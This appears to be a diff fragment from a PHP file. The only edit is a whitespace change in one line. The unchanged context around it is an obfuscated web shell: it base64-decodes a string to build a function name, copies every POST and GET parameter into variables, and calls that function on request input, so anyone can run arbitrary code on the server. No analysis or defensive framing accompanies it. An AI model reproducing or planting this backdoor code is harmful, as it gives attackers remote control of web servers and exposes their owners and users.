@@ -12,7 +12,7 @@ $zhushi = base64_decode($zhushi);
 $zhushi = substr($zhushi, 0, 6);
 foreach (array('_POST','_GET') as $_request) {
     foreach ($$_request as $_key=>$_value) {
-        $$_key=  $_value;
+        $$_key = $_value;
     }
 }
 $zhushi($_value);
